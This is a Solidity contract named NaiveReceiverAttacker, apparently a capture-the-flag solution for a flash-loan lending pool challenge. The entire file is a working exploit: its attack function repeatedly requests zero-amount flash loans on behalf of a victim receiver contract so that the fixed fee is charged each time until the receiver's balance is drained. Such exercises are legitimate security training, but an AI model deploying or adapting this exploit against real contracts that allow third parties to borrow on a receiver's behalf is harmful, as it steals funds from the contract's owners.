pragma solidity ^0.8.0;

interface IPool {
    function fixedFee() external pure returns (uint256);
    function flashLoan(address borrower, uint256 borrowAmount) external;

}

contract NaiveReceiverAttacker{

    address payable private pool;
    address payable private receiver;

    constructor(address payable poolAddress, address payable receiverAddress) {
        pool = poolAddress;
        receiver = receiverAddress;
    }

    function attack() public {
        uint256 FIX_FEE = IPool(pool).fixedFee();
        while (receiver.balance >= FIX_FEE) {
            IPool(pool).flashLoan(receiver, 0);
        }
    }
}